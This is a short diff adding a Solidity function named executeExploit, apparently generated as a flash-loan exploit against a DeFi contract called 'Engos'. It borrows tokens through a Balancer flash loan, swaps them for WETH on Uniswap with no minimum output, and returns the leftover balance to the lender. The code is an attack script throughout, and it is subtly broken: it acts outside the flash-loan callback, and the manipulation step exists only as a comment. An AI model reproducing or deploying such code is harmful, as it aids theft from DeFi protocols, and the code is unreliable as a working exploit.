@@ -1,0 +1,36 @@
+```solidity
+<executeExploitCode>
+function executeExploit(uint256 amount) internal {
+    // Step 1: Borrow WETH using Flashloan
+    address[] memory tokens = new address[](1);
+    tokens[0] = address(valuableToken);
+
+    // Lock in the amount for the flash loan
+    uint256[] memory amounts = new uint256[](1);
+    amounts[0] = amount;
+
+    // Execute the flash loan
+    IBalancerVault(flashloanProvider).flashLoan(address(this), tokens, amounts, "");
+
+    // Step 2: Do the exploit
+    // This interaction would involve using the Engos contract to manipulate the price 
+    // during the swap process.
+
+    // Example: Swap the received tokens via Uniswap
+    // Setting up the path for swapping
+    address[] memory path = new address[](2);
+    path[0] = address(valuableToken); // Token we just got (assuming it's valid)
+    path[1] = uniswapRouter.WETH(); // Swapping for WETH
+
+    // The amount to output from the swap should ideally be validated based on the reserves
+    uint256 amountOutMin = 0; // Can specify logic to estimate minimum output based on Uniswap prices
+
+    // Execute the swap
+    uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, amountOutMin, path, address(this), block.timestamp);
+
+    // Ensure we have repaid the flash loan
+    uint256 currentValuableBalance = valuableToken.balanceOf(address(this));
+    valuableToken.transfer(flashloanProvider, currentValuableBalance);
+}
+</executeExploitCode>
+```
